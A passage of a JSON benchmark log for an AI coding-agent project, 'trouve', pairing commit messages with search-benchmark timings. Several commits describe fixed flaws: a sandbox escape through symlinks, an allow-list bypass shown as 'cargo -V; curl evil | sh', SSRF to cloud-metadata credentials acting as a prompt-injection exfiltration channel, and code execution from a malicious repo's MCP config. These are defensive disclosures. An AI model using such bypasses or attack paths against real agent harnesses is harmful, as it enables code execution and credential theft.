from the session's branch, and spawn_output collects\nstatus, last message and usage, optionally waiting. Guardrails: one level\nof depth, four concurrent children, inherited permission mode, read-only\nparents can't escalate. Read-only same-session children skip the session\nlock (and checkpointing) so they run concurrently with the parent's turn.\nSpawned threads carry a fork marker in the tab strip.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* search_transcript: recover history lost to compaction and handoff digests\n\nEngine-served tool (bridged to vendors too): query mode returns\nturn-stamped snippets from the event log across thread, session, or\nworkspace scope (never crossing workspaces); turn mode replays one turn's\nmessages in full. The compaction summary and digest truncation markers now\npoint at the tool, so models reach for it exactly when context was elided.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Canonicalize tool paths against the worktree root\n\nToolCtx::resolve only checked path components lexically, so a symlink\ncommitted to the worktree (git stores arbitrary targets) let every file\ntool read or write outside the sandbox — including in read-only modes,\nsince read_file is ungated. Canonicalize the deepest existing ancestor\nand require it to stay under the canonicalized worktree; dangling\nsymlinks fail resolution instead of being written through.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Key complex shell commands on the exact command string\n\nThe allow-list keyed every shell command on its first whitespace token\nwhile handing the whole string to sh -c, so one \"always approve\" for\ncargo unlocked `cargo -V; curl evil | sh`. Commands containing shell\nmetacharacters (chaining, substitution, redirection, escapes) now key\non the exact command string; only metacharacter-free commands share\nthe first-token key.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Guard web_fetch against SSRF and gate it behind approval\n\nweb_fetch accepted any http(s) URL with no approval in any permission\nmode: reqwest followed redirects to anywhere, and nothing blocked\nloopback, link-local (cloud metadata), or private ranges — a zero-click\nexfiltration channel for prompt injection, and a path to credentials at\n169.254.169.254. Resolve and validate every hop's addresses, pin the\nconnection to the validated set so DNS can't rebind between check and\nconnect, follow redirects manually with re-validation, and require\nper-session approval for the tool in every permission mode.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Only auto-spawn MCP servers from the user's own config\n\nA repo's .agents/.mcp.json was discovered and its servers were spawned\nat the start of every turn — including plan/read-only turns — before any\napproval, and ${VAR} env values were expanded from the process\nenvironment into those commands. Cloning a malicious branch and starting\none turn was therefore arbitrary code execution plus secret\nexfiltration. Restrict auto-spawn (native turns, vendor CLIs, and the\nsettings probe) to servers whose winning definition comes from the\nuser's own config dir; repo-scoped servers (and user servers a branch\ntries to redefine) are listed as \"untrusted\" but never run.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Require a bearer token and loopback Host on the server API\n\nThe HTTP server drives an agent that runs shell commands and edits\nfiles, but had no authentication and no Host/Origin validation: any\nlocal process could drive it, and a web page could too via DNS\nrebinding. Add a ServerSecurity layer enforcing a per-launch bearer\ntoken on /v1 routes and rejecting non-loopback Host headers. The\nstandalone binary generates and persists the token (0600) or reads\nTROUVE_AUTH_TOKEN; the desktop app generates one and passes it to the\nserver it spawns. build_router stays open for in-process tests; serve\ngoes through build_secured_router. The internal MCP bridge stays exempt\nfrom the token (dialed by server-spawned children) but loopback-bound.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Repair dangling tool calls in the stored transcript\n\nA crash or restart between persisting an assistant message with\ntool_calls and persisting the tool results (execution can take minutes;\napproval waits are unbounded) left the transcript with a tool_call that\nhas no matching result. Both OpenAI and Anthropic reject that, so every\nfuture turn failed and the thread was permanently wedged. Sanitize the\ntranscript before each provider request: synthesize an \"interrupted\"\nresult for any unanswered call, and drop empty assistant messages (which\nserialize to an empty content block Anthropic also rejects). Stop\npersisting empty assistant messages in the first place.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Base compaction on the last request's input tokens, not the turn sum\n\nA turn re-sends the full transcript once per tool iteration, and usage\nwas summed across all of them. That sum was then reused as the\ncontext-size proxy for the compaction trigger, so a routine multi-tool\nturn on a small transcript reported many times the real context and\ncompacted a conversation nowhere near the window — a full-transcript\nsummary call per turn plus lost detail. Record the last request's input\n(input + cached) separately as the context proxy; keep the summed totals\nfor billing.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Decode SSE streams by complete line, not per network chunk\n\nAll four SSE parsers (Anthropic, OpenAI-compat, Codex Responses, and the\nclient event/terminal streams) decoded each network chunk with\nfrom_utf8_lossy before buffering. A multi-byte character split across a\nchunk boundary was replaced with U+FFFD on both sides, corrupting model\noutput and — when the split fell inside a streamed tool-call argument or\nan event envelope — invalidating the JSON so the call ran with null args\nor the event was dropped. Buffer raw bytes and decode only complete\nlines (split on \\n, never part of a multi-byte sequence).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Reconnect the app's thread event stream instead of freezing\n\nThe thread follower ran once and only logged when the stream ended, and\nthe followed set was never cleared so it couldn't restart. Any stream\ndrop (a server-side store error during replay, or the child server\nrestarting) left that thread's chat permanently stale — no deltas, tool\ncards, approval prompts, or turn-completion — until app relaunch. Loop\nwith a 2s backoff like the server-scope stream, resuming from the last\ncursor delivered (tracked in the closure so the error path resumes\ncorrectly) so nothing is replayed or lost.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Harden vendor CLI installs: validate versions, guard tar extraction\n\nVersion strings scraped from vendor endpoints flowed unvalidated into\nremove_dir_all/rename and download URLs, so a compromised endpoint\nreturning something like 1/../../etc could touch arbitrary directories.\nConstrain versions to a path-safe allowlist before use. Tarballs were\nunpacked with tar's default unpack(), which will write through a symlink\nentry pointing outside the target (tar-slip); validate every entry's\npath and link target for containment and reject escapes. Write\ninstalled.json atomically (temp + rename) so a crash mid-write can't\nleave a truncated pointer that reads as 'not installed'.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Skip checkpointing for lock-free backend children\n\nrun_backend_turn checkpointed unconditionally, but a read-only spawned\nchild running on a vendor backend model holds no session lock (it runs\nconcurrently with the parent turn by design). Its git add -A / write-tree\ntherefore raced the parent's in-flight git operations and snapshotted the\nparent's half-finished work as the child's checkpoint. Skip the\ncheckpoint for concurrent children, matching the native path and the\nper-session worktree serialization invariant.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Preserve Anthropic signed thinking blocks across tool use\n\nThe Anthropic stream discarded signature_delta and never replayed\nthinking blocks, but the Messages API rejects a follow-up tool-use turn\nwhose thinking blocks aren't preserved when extended thinking is on — so\nany thinking_level + tool call (i.e. every agent turn) got a 400,\nbreaking the advertised feature. Capture the signed thinking (and\nredacted_thinking) blocks as a new ProviderEvent::Reasoning, carry them\non Message::Assistant (opaque to other providers), and replay them\nverbatim at the head of the assistant turn.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Clamp code-view highlight spans to char boundaries\n\nsegment_parts sliced each line at highlighter byte offsets clamped only\nto line length. A tree-sitter span boundary landing inside a multi-byte\nUTF-8 character panics the slice — and this runs per visible line per\nrender, so one accented or emoji character in highlighted code crashed\nthe UI. Snap span offsets down to the nearest char boundary before\nslicing.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Delete attachments and spawned-thread rows with the session\n\ndelete_session removed events, messages, threads, and related rows but\nnot attachments or spawned_threads, both of which FK to threads(id) with\nforeign_keys=ON. Any session that ever took an attachment or spawned a\nchild failed the DELETE — after the engine had already removed the\nworktree and emitted SessionDeleted, leaving a zombie session gone from\ndisk but present in the DB. Delete both tables inside the transaction and\nremove attachment files from disk first.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Order event broadcast with cursor assignment; tolerate unknown events on replay\n\nTwo event-log robustness fixes. append_event assigned the cursor under\nthe connection lock but broadcast after releasing it, so two concurrent\nappends to one scope could publish out of order (6 before 5); live SSE\nsubscribers drop anything <= the last cursor seen, so event 5 was lost\nuntil reconnect. Broadcast under the same lock. Separately, events_after\npropagated a deserialization error for the whole scope, so a single event\nwritten by a newer build made the session/thread permanently unloadable;\nskip and log undeserializable rows instead.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Make append_checkpoint atomic\n\nThe redo-tail DELETE, the undo_pos reset, and the checkpoint INSERT ran\nas three separate statements, so a crash between them could drop the redo\ntail without recording the new checkpoint (leaving undo_pos NULL and a\nseq gap). Wrap them in one transaction.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Bound MCP requests, drop the lock across handshakes, and evict connections\n\nAn MCP tools/call had no timeout and held the pipe mutex while waiting,\nso a hung server wedged the turn (and its session lock) forever; the\nmanager also held its global connections lock across the untimed connect\nhandshake, so one misbehaving server blocked all MCP everywhere. Bound\nevery request (120s) and connect (30s), look up config and run the\nhandshake outside the connections lock, evict a connection after a failed\ncall so a crashed server reconnects instead of staying broken, and evict\na worktree's connections on session delete so their child processes don't\nleak.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Add turn cancellation (protocol 0.17)\n\nA running turn could not be interrupted: approval waits and MCP calls\nblocked indefinitely while holding the session lock, with no endpoint to\nstop them. Add POST /v1/threads/{id}/cancel and Engine::cancel_turn,\nbacked by a per-turn cancellation token the native and backend loops\nselect against — interrupting the provider/vendor stream, the in-flight\ntool call, and the approval wait at the next await point, and pausing the\nqueue with a new turn.cancelled event. Bumps the protocol to 0.17 and\nregenerates the OpenAPI snapshot.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Release the active-thread claim on dispatch error or panic\n\ndispatch_queue inserted the thread into active_threads, then called\nemit_queue and next_turn before spawning the dispatcher; if either\nfailed the claim leaked and the thread could never dispatch again. It\nalso leaked if the dispatcher task panicked (tokio swallows the panic),\nwedging the thread as permanently active with no TurnFailed event.\nRelease the claim on the setup error paths, and wrap the dispatcher in\ncatch_unwind to release the claim + cancel token and emit TurnFailed on\npanic.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate spawn tools by mode, fix spawn_session base, safe mode fallback, review mode\n\nFour related mode/spawn correctness fixes:\n- spawn_thread/spawn_session now respect the mode's allowed_tools (specs\n  and execution), so restrictive/read-only modes can't silently create\n  branches or child agents; the depth guard still takes precedence for\n  children.\n- spawn_session bases the child on the parent's latest checkpoint commit\n  instead of the session branch — checkpoints never move the branch, so\n  the child previously saw none of the parent's work.\n- An unresolvable thread mode (deleted/invalid TOML) now falls back to a\n  locked-down read-only mode, not the permissive code mode, so a thread\n  the user believed was restricted can't gain write access.\n- Review mode no longer advertises shell tools it can never run (it is\n  read_only, and the gate denies mutating tools there).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Stage native-provider attachments into the worktree so tools can read them\n\nAttachments were annotated into the prompt as absolute data-dir paths\nwith 'read them from disk', but the file tools reject absolute paths (the\nworktree sandbox), so read_file could never open them — attachments were\nunreachable on the native path. Copy them into a gitignored\n.trouve/attachments/ dir in the worktree and annotate worktree-relative\npaths the tools can actually open.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Serialize OAuth refresh; harden secrets file writes\n\nTwo credential-store fixes. bearer() did load/check/refresh/store with no\nsynchronization, so concurrent turns sharing an Arc'd token each POSTed\nthe same refresh_token — with rotating-refresh-token providers the reuse\nrevokes the whole family and logs the user out, and the racing set()s\nclobber each other; serialize refresh behind a mutex with a re-check.\nFileStore wrote secrets with std::fs::write (default umask, world-readable\nuntil the follow-up chmod) and treated a corrupt file as empty (so the\nnext set() wiped every other credential); create the temp file 0600,\nwrite-then-rename, and surface a parse error instead of silently\ndefaulting.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Validate git refs from the API and pass --end-of-options\n\nbase_ref flows from the HTTP API straight into git as a positional\nargument, so a value starting with '-' would be parsed as an option\n(git diff accepts file-writing flags like --output=). Reject refs that\nare empty or start with '-', and pass --end-of-options before the ref in\ncreate_worktree and session_diff so git can never treat it as a flag.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Preserve a malformed config.toml instead of overwriting it\n\nA TOML parse error made Config::load fall back to Config::default(), and\nthe next persisted settings change rewrote config.toml from that default\nsnapshot, destroying the user's hand-written providers, enterprise hosts,\nand inline api keys. Back the broken file up to <config>.toml.corrupt,\nrun with defaults for the session, and refuse to persist over the file\nuntil the user fixes it.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Verify GGUF downloads against Content-Length and catalog size\n\ndownload_gguf streamed to a .part file and renamed it to final with no\nintegrity check, so a connection dropped mid-download (or a wrong file\nserved from the mutable main ref) produced a truncated/corrupt model that\nwas then loaded. Reject the download when the byte count doesn't match the\nresponse Content-Length, or differs from the curated catalog size by more\nthan 1%.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Close terminal subscribe double-emit and concurrent-open races\n\nTwo terminal races. subscribe() opened its broadcast receiver and then\nsnapshotted the backlog, while the reader appended to the backlog and\nthen broadcast — so a chunk arriving in that window landed in both the\nreplay and the live stream, and since live SSE chunks carry no offset the\nclient couldn't dedup it: the bytes rendered twice and every later offset\nwas skewed (breaking resume). Now the reader broadcasts under the backlog\nlock and subscribe opens its receiver under that same lock, so a chunk is\ndelivered through exactly one path. Also serialize open() so two\nconcurrent opens for one session can't both spawn a shell and leak one.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Clear stale thread state when the open session vanishes; avoid index panics\n\nWhen the current session was deleted elsewhere (another window or an\nautomation), reload_sessions recomputed current_session to None but left\nthreads and current_thread pointing at the gone session, so the chat kept\nrendering it and current_thread_id returned a dead thread. Clear both.\nAlso route current_thread_id and update_current_thread through .get()\ninstead of direct indexing, so a transient threads/current_thread\ndisagreement degrades gracefully instead of panicking.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Coalesce streaming-delta chat renders\n\nEvery AssistantDelta re-folded and re-cloned the whole transcript, so a\nturn's stream cost ~O(n^2) over its length. Throttle delta-driven chat\nre-renders to at most one per 50ms; non-delta events (including the\nfinalized assistant.message and turn.completed) still render immediately,\nso the final token is never left unshown.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Buffer codex notifications that arrive before subscribe\n\nThe codex thread id is only known after thread/start returns, and\nsubscribe happens after that, so any thread-scoped notification the\napp-server emitted in the gap was dropped by the reader (no route yet).\nBuffer notifications for a named-but-unrouted thread and flush them when\nsubscribe registers, so nothing between thread/start and subscribe is\nlost; clear the buffer on unsubscribe.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Bound file reads and guard apply_patch moves\n\nLow-severity robustness in the tool layer: read_file now checks file size\nvia metadata before buffering (rejecting oversized images before the read\nand text files over 32MB up front, since read_to_string ignores\noffset/limit); grep skips files over 8MB so one huge or newline-free file\ncan't spike memory/CPU; and apply_patch's 'Move to' refuses to overwrite\nan existing destination (which also deleted the source) like the Add\nguard already does.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Surface iteration-limit truncation; fix UTF-8 seams in shell output and login parsing\n\nThree low-severity correctness fixes. A turn that exhausts the 32-step\niteration budget mid-task ended silently as if finished; it now appends a\nvisible note (and a transcript line the model sees) so the user knows to\ncontinue. shell_output decoded the incremental byte slice at an arbitrary\noffset, mangling a multi-byte character split across two reads; it now\ndecodes only up to the last complete character and carries the remainder.\nfind_user_code sliced the original line with a byte offset from its\nlowercased copy, which could panic on non-ASCII; it maps through char\nindices instead.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fail PKCE on denial; restrict the Codex responses URL override\n\nThe PKCE callback ignored the error redirect (access_denied), so a user\nwho declined consent hung behind a 'login complete' page until the\n10-minute timeout; detect error= and fail immediately.\nTROUVE_CODEX_RESPONSES_URL redirected the ChatGPT subscription bearer\ntoken to any host via one env var; now non-loopback overrides are refused\nunless TROUVE_ALLOW_REMOTE is set, and any override is logged.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Cap the terminal scrollback partial-line buffer\n\nA process emitting megabytes with no newline (a \\r progress bar or binary\noutput) grew the pending partial line without bound. Force-flush it as a\nrow once it exceeds 64KB.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Doc/cleanup follow-ups for the git-URL removal and crate move\n\n- clear index now also removes the defunct <cache>/clones dir left by\n  1.1-2.0, which no command could otherwise clean up.\n- marketplace.json no longer advertises 'remote git repository' support\n  that the tool now rejects.\n- DIFFERENCES.md notes its module-map paths are relative to the moved\n  crate root; the root Cargo.toml MSRV comment no longer cites the deleted\n  clone cache.\n- spawn_session's tool description reflects that the child is based on the\n  parent's latest checkpoint.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* cargo fmt\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Silence clippy on the new code\n\nDrop a useless .into() in the dispatch_queue error path and allow\ntoo_many_arguments on handle_tool_call (it gained a cancellation token).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Secure Claude MCP temp configs\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Scope Codex MCP approvals per server\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Block session deletion during active turns\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Delete session state before filesystem cleanup\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Keep queued prompts durable through dispatch\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Record automation outcomes after turns finish\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Summarize turns that hit the tool-step limit\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Batch persisted chat event replay\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Percent-encode Unicode query values as UTF-8\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Move chat syntax highlighting off the UI thread\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Coalesce terminal output rendering\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Terminate shell process groups on cleanup\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Raise workspace MSRV to Rust 1.92\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Install Linux native dependencies in CI\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Format remaining workspace sources\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Authenticate the internal MCP bridge\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Satisfy stable Clippy remote parsing lint\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Keep client tests after helper definitions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix workspace rustdoc warnings\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Allow literal protocol model placeholder in docs\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Add scoped automation permission modes\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Update OpenAPI for automation permissions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Read Claude Code subscription usage via the get_usage control request\n\nThe providers settings screen showed 'Anthropic does not provide\nsubscription usage to third-party apps' for Claude Code. It does,\nthrough the same sanctioned stream-json surface the backend already\ndrives: a print-mode process answers a get_usage control request with\nthe data behind the TUI's /usage dialog (plan, 5h/weekly rate-limit\nwindows, extra-usage credits). The /usage slash command itself has no\nheadless equivalent, but this control request is how SDK clients ask\nfor the same snapshot.\n\nClaudeBackend::subscription_health spawns a short-lived\n'claude -p --input-format stream-json --output-format stream-json'\nprocess (no user message, so no model turn or token cost), sends the\ncontrol request, and parses the response into SubscriptionHealth.\nBoth payload shapes are handled: the classic flat buckets (five_hour /\nseven_day / seven_day_sonnet / seven_day_opus, RFC 3339 resets) and\nthe newer self-describing 'limits' array (unix-seconds resets) that\nAnthropic is migrating to, deduped by window label.\n\nThe settings screen now renders up to four meters per provider (Claude\nMax reports three windows; model-scoped weeks can add more), and the\n'vendor does not share this' note is now Cursor-only. format_reset\nmoves to the crate root so codex.rs and claude.rs share it.\n\nVerified against Claude Code v2.1.207: the control request answers in\nunder a second; logged-out installs report rate_limits_available=false\nand surface as 'unavailable' with a login hint.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-15T21:33:53-05:00",
          "tree_id": "83d50440a4bf5aa668654a2f30ffbbe13dde686a",
          "url": "https://github.com/jimsimon/trouve/commit/43a1a7144d9c6fd55da4a6274f970522c74a4106"
        },
        "date": 1784169466394,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4882991.222222222,
            "range": "± 8921",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36999.491022894785,
            "range": "± 18",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2990917.9117647056,
            "range": "± 6992",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1382023.9784946237,
            "range": "± 8998",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "535ba8a92c4822065cd15153270198895c8a3728",
          "message": "Update Rust crate bytemuck to v1.25.1 (#46)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-16T13:46:47-05:00",
          "tree_id": "e9febd89c0e08058f27790ba658469b137f33750",
          "url": "https://github.com/jimsimon/trouve/commit/535ba8a92c4822065cd15153270198895c8a3728"
        },
        "date": 1784227822018,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4847701.300000001,
            "range": "± 7624",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37080.558209351315,
            "range": "± 9",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3023624.205882353,
            "range": "± 1680",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1370150.6257375912,
            "range": "± 9661",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "dde35349457fb61a6897187e7f36e5b09ac7965b",
          "message": "Batch semver minor and patch updates into one Renovate PR (#51)\n\nAdd a catch-all package rule (equivalent to the group:allNonMajor preset)\ndeclared last so it takes precedence over the tree-sitter and GitHub\nActions groups for non-major updates; those groups still apply to major\nand digest updates.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T17:26:44-04:00",
          "tree_id": "265dddfd2b0b42c9cab7ff2ed217248290e91f4b",
          "url": "https://github.com/jimsimon/trouve/commit/dde35349457fb61a6897187e7f36e5b09ac7965b"
        },
        "date": 1784237334290,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4941921.300000001,
            "range": "± 9335",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37011.81151461517,
            "range": "± 10",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3047146.2352941176,
            "range": "± 2463",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1342374.7621527778,
            "range": "± 7456",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "8044d09df6862b62dcd83e84b6932e3c64f87292",
          "message": "Read Cursor subscription usage from the dashboard RPC via the CLI's login (#48)\n\n* Read Cursor subscription usage from the dashboard RPC via the CLI's login\n\nThe Cursor CLI has no usage surface (no subcommand, no ACP method), but\nthe token it stores in auth.json is accepted by the dashboard's\nConnect-RPC endpoint — verified against a real logged-in Ultra account:\naiserver.v1.DashboardService/GetCurrentPeriodUsage returns per-bucket\nincluded-usage percentages (total / API models / Auto), the on-demand\nspend limit in cents, and the billing cycle bounds; GetPlanInfo carries\nthe plan name.\n\nCursorBackend::subscription_health reads the CLI's auth.json (mirroring\nthe CLI's own per-platform path resolution; the token is never\nrefreshed by us — same policy as the direct-Codex provider) and makes\nthe two unary Connect-JSON calls. Windows map to the meters the\nsettings screen already renders (four fit the cap added for Claude):\nincluded total/API/Auto percent plus on-demand spend, all resetting at\nthe billing cycle end (int64 millis-as-string handled). The on-demand\ndollars ride in the credits line. API-key providers (cursor-api) are\nusage-billed with no allowance, so they report 'unsupported' with an\nexplanation instead of querying the dashboard.\n\nLike codex-api, this endpoint is tolerated rather than contracted; the\nsettings-screen description now says Cursor's read is undocumented and\nmay break. The engine's per-vendor fallback note is gone since all\nthree shipped backends now answer for themselves.\n\nTested with unit tests over the real payload shapes, an adapter e2e\ntest against a local HTTP stub asserting both RPC paths and the Bearer\ntoken from auth.json, and an api-key test for the unsupported path.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review feedback on the dashboard usage query\n\n- Cap the whole usage lookup at USAGE_TIMEOUT: the reqwest client\n  timeout is per request, so the optional GetPlanInfo call now gets\n  only the time GetCurrentPeriodUsage left over, degrading to no plan\n  name when the budget is spent instead of stretching to ~2x.\n- Test stub records the request before writing the response, so the\n  client can no longer finish and assert before the recording lands.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T17:29:03-04:00",
          "tree_id": "c4737d027df30ad3fc25666b06693b6ab923eb3a",
          "url": "https://github.com/jimsimon/trouve/commit/8044d09df6862b62dcd83e84b6932e3c64f87292"
        },
        "date": 1784237580897,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4905535,
            "range": "± 9296",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36915.74973945807,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3031010.117647059,
            "range": "± 1874",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1344240.5948616602,
            "range": "± 17873",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "df291297455e495895baf13dd73de45d176fa3b2",
          "message": "Offline mode: gate prompt entry, keep local models usable, announce recovery (#49)\n\n* Report server connectivity; list only runnable models offline\n\nThe server owns internet reachability (it talks to the model vendors):\nan opt-in probe monitors it, transitions land in the event log as\nserver.connectivity_changed, and ServerInfo.online carries the snapshot.\nWhile offline /v1/models drops remote providers and vendor backends\ninstead of degrading to static fallback catalogs (the lone cursor/default\nentry) — only the local provider and loopback endpoints survive, so\nclients can gate prompt entry on the list being non-empty.\n\nProbing is wired only in the standalone server binary; probe-less\nengines always report online, keeping cargo test offline-safe.\n\nProtocol 0.18 -> 0.19 (additive).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate prompt entry and explain when the server is offline\n\nInstead of silently showing vendor fallback models, the app now reacts\nto the server's connectivity state: an offline banner appears on the\nchat composer, the new-session/new-thread form, and the automations\nscreen. With local models available the pickers stay usable (restricted\nto them by the server-filtered list); with nothing usable all prompt\ninputs — composer, pickers, model knobs, attach/send, queue send-now,\nautomation add/edit/run — are disabled with the reason shown. Recovery\nre-enables everything, refreshes the model list, and shows a transient\nback-online notice.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Detect a lost server connection; auto-respawn the local server\n\nThe offline banner only covers what the server reports about its own\ninternet — it says nothing when the server itself becomes unreachable\n(crashed local child, or the client's network for TROUVE_SERVER_URL\nsetups). The app previously just went quiet with stale data.\n\nThe server-events follow task now doubles as a connection watchdog:\nwhen the stream drops it probes /v1/info; three consecutive failures\nraise a red blocking banner (worded for local vs remote), and the first\nsuccessful probe clears it, refetches the connectivity snapshot (replay\ndrops stale connectivity events, so the offline flag could otherwise\nstick wrong), reloads catalogs/sessions, and shows a transient\nreconnected notice.\n\nFor the locally spawned server, a watcher task owns the child and\nreports its exit; the app respawns it once on the same address/token\n(60s crash-loop guard) and only asks for an app restart when that\nfails.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review feedback on offline mode\n\n- is_loopback_base_url parses the URL authority and requires an exact\n  localhost host or a loopback IP; substring matching also accepted\n  remote hosts like 